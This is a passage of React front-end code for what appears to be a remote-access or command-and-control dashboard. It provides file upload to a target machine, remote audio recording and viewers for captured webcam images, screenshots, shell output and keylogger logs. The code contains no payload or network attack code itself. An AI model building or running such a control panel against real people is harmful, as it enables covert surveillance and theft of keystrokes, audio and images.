                                onDragEnter={handleDrag}
                                onDragLeave={handleDrag}
                                onDragOver={handleDrag}
                                onDrop={handleDrop}
                            >
                                <FaUpload className="text-4xl mx-auto mb-4" style={styles.subtitle} />
                                <p className="mb-2" style={styles.title}>Drag & drop files here</p>
                                <p className="text-sm mb-4" style={styles.subtitle}>or</p>
                                <button
                                    onClick={() => fileInputRef.current?.click()}
                                    className="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg transition-colors text-white"
                                >
                                    Browse Files
                                </button>
                                <input
                                    ref={fileInputRef}
                                    type="file"
                                    multiple
                                    className="hidden"
                                    onChange={(e) => handleFiles(e.target.files)}
                                />
                            </div>

                            {uploadedFiles.length > 0 && (
                                <div className="space-y-2 max-h-40 overflow-y-auto">
                                    {uploadedFiles.map((file, i) => (
                                        <div key={i} className="flex items-center justify-between p-3 rounded-lg" style={styles.inputBg}>
                                            <div className="flex items-center gap-3">
                                                <div className="w-8 h-8 bg-blue-500/20 rounded-lg flex items-center justify-center">
                                                    <FaUpload className="text-blue-400 text-sm" />
                                                </div>
                                                <div>
                                                    <p className="text-sm" style={styles.title}>{file.name}</p>
                                                    <p className="text-xs" style={styles.subtitle}>{file.size}</p>
                                                </div>
                                            </div>
                                            <button
                                                onClick={() => setUploadedFiles(prev => prev.filter((_, idx) => idx !== i))}
                                                className="hover:text-red-400"
                                                style={styles.subtitle}
                                            >
                                                <FaTimes />
                                            </button>
                                        </div>
                                    ))}
                                </div>
                            )}

                            <div className="flex gap-3 justify-end">
                                <button onClick={() => { setShowUploadModal(false); setUploadedFiles([]); }} className="px-4 py-2 transition-colors hover:opacity-80" style={styles.subtitle}>
                                    Cancel
                                </button>
                                <button
                                    onClick={handleUpload}
                                    disabled={uploadedFiles.length === 0}
                                    className="px-6 py-2 bg-green-600 hover:bg-green-500 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed text-white"
                                >
                                    Upload {uploadedFiles.length > 0 && `(${uploadedFiles.length})`}
                                </button>
                            </div>
                        </div>
                    </Modal>
                )}

                {/* Audio Record Modal */}
                {showAudioModal && (
                    <Modal onClose={() => setShowAudioModal(false)} title="Record Audio">
                        <div className="space-y-4">
                            <div className="flex items-center gap-3 p-3 bg-red-500/10 rounded-lg text-red-400 text-sm">
                                <FaMicrophone />
                                <span>Audio will be recorded on {target?.hostname}</span>
                            </div>
                            <div>
                                <label className="block text-sm font-medium mb-2" style={{ color: 'var(--app-content-main-color)' }}>
                                    Duration (seconds)
                                </label>
                                <input
                                    type="number"
                                    value={audioDuration}
                                    onChange={(e) => setAudioDuration(Math.max(1, parseInt(e.target.value) || 1))}
                                    min="1"
				    step="1"
                                    placeholder="Enter duration in seconds"
                                    className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500"
                                    style={styles.inputBg}
                                />
                            </div>
                            <div className="flex gap-3 justify-end">
                                <button onClick={() => setShowAudioModal(false)} className="px-4 py-2 transition-colors hover:opacity-80" style={styles.subtitle}>
                                    Cancel
                                </button>
                                <button onClick={recordAudio} className="px-6 py-2 bg-red-600 hover:bg-red-500 rounded-lg transition-colors text-white">
                                    Record
                                </button>
                            </div>
                        </div>
                    </Modal>
                )}

                {/* Detail Modal */}
                {selectedItem && (
                    <Modal onClose={() => setSelectedItem(null)} title="Details" large>
                        <div className="space-y-4">
                            {(activeTab === 'webcam' || activeTab === 'screenshot') && (
                                <img src={selectedItem.path} alt="capture" className="w-full rounded-lg" />
                            )}
                            {activeTab === 'shell' && (
                                <pre className="p-4 rounded-lg overflow-x-auto text-sm text-green-400 font-mono" style={{ background: 'var(--app-bg)' }}>
                                    {`C:\\Users\\${username}>\n${selectedItem.output}`}
                                </pre>
                            )}
                            {activeTab === 'keylogger' && (
                                <pre className="p-4 rounded-lg overflow-x-auto text-sm font-mono" style={{ background: 'var(--app-bg)', color: 'var(--app-content-main-color)' }}>
                                    {selectedItem.log.replace(/\s*(\[\d{2}:\d{2}:\d{2}\])/g, '\n$1').trim()}
                                </pre>
                            )}
                            {activeTab === 'audio' && (
                                <audio controls className="w-full">
                                    <source src={selectedItem.path} type="audio/mpeg" />
                                </audio>
                            )}
                            <p className="text-sm" style={styles.subtitle}>Captured: {formatDate(selectedItem.created_at)}</p>
                        </div>
                    </Modal>
                )}
            </div>
        </div>
    );

}

// Info Item Component
function InfoItem({ icon, label, value, isCode, showFlag, countryCode }) {
    return (
        <div className="flex items-center gap-3">
            <span className="text-lg flex items-center justify-center" style={{ minWidth: '24px' }}>{icon}</span>
            <div className="flex-1 min-w-0">
                <p className="text-xs font-medium" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>{label}</p>
                {isCode ? (
                    <code className="text-sm px-2 py-0.5 rounded" style={{ background: 'var(--app-bg)', color: 'var(--app-content-main-color)' }}>{value}</code>
                ) : showFlag && countryCode ? (
                    <div className="flex items-center gap-2">
                        <CountryFlag country={countryCode} height="1em" width="1.3em" />
                        <p className="text-sm truncate" style={{ color: 'var(--app-content-main-color)' }}>{value}</p>
                    </div>
                ) : (
                    <p className="text-sm truncate" style={{ color: 'var(--app-content-main-color)' }}>{value}</p>
                )}
            </div>
        </div>
    );
}

// Data Card Component
function DataCard({ item, type, index, formatDate, onSelect }) {
    if (type === 'webcam' || type === 'screenshot') {
        return (
            <div
                onClick={onSelect}
                className="group relative aspect-video rounded-xl overflow-hidden cursor-pointer hover:ring-2 hover:ring-blue-500 transition-all"
                style={{ background: 'var(--app-bg)' }}
            >
                <img src={item.path} alt="capture" className="w-full h-full object-cover" />
                <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                    <div className="absolute bottom-0 left-0 right-0 p-3">
                        <p className="text-white text-sm">{formatDate(item.created_at)}</p>
                    </div>
                    <button className="absolute top-2 right-2 p-2 bg-black/50 rounded-lg hover:bg-black/70 transition-colors">
                        <FaExpand className="text-white" />
                    </button>
                </div>
            </div>
        );
    }

    if (type === 'audio') {
        return (
            <div className="flex items-center gap-4 p-4 rounded-xl transition-colors" style={{ background: 'var(--app-bg)' }}>
                <div className="w-12 h-12 bg-gradient-to-r from-red-500 to-red-600 rounded-xl flex items-center justify-center flex-shrink-0">
                    <FaMicrophone className="text-white text-lg" />
                </div>
                <div className="flex-1 min-w-0">
                    <p className="font-medium" style={{ color: 'var(--app-content-main-color)' }}>Audio Recording #{index + 1}</p>
                    <p className="text-sm" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>{formatDate(item.created_at)}</p>
                </div>
                <audio controls className="h-10 w-48">
                    <source src={item.path} type="audio/mpeg" />
                </audio>
            </div>
        );
    }

    return (
        <div
            onClick={onSelect}
            className="flex items-start gap-4 p-4 rounded-xl transition-colors cursor-pointer"
            style={{ background: 'var(--app-bg)' }}
        >
            <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${
                type === 'shell' ? 'bg-blue-500/20 text-blue-400' : 'bg-orange-500/20 text-orange-400'
            }`}>
                {type === 'shell' ? <FaTerminal /> : <FaKeyboard />}
            </div>
            <div className="flex-1 min-w-0">
                <code className="text-sm px-3 py-2 rounded-lg block truncate" style={{ background: 'var(--sidebar)', color: 'var(--app-content-main-color)' }}>
                    {type === 'shell' ? (item.output?.split('\n')[0]?.length > 25 ? item.output?.split('\n')[0].slice(0, 25) + "..." : item.output?.split('\n')[0]) : (item.log?.split('\n')[0]?.length > 25 ? item.log?.split('\n')[0].slice(0, 25) + "..." : item.log?.split('\n')[0]) }
                </code>
                <p className="text-xs mt-2 font-medium" style={{ color: 'var(--app-content-main-color)', opacity: 0.6 }}>{formatDate(item.created_at)}</p>
            </div>
        </div>
    );
}

// Modal Component
function Modal({ children, onClose, title, large }) {
    return (
        <div className="fixed inset-0 flex items-center justify-center bg-black/70 backdrop-blur-sm z-50 p-4" onClick={onClose}>
            <div
                className={`rounded-2xl shadow-2xl w-full ${large ? 'max-w-3xl' : 'max-w-md'} max-h-[90vh] overflow-hidden`}
                style={{ background: 'var(--sidebar)' }}
                onClick={e => e.stopPropagation()}
            >
                <div className="flex items-center justify-between p-4 border-b" style={{ borderColor: 'var(--table-border)' }}>
                    <h3 className="text-lg font-semibold" style={{ color: 'var(--app-content-main-color)' }}>{title}</h3>
                    <button onClick={onClose} className="p-2 transition-colors hover:opacity-70" style={{ color: 'var(--app-content-secondary-color)' }}>
                        <FaTimes />
                    </button>
                </div>
                <div className="p-4 overflow-y-auto max-h-[calc(90vh-80px)]">
                    {children}
                </div>
            </div>
        </div>
    );
}

export default Interact;

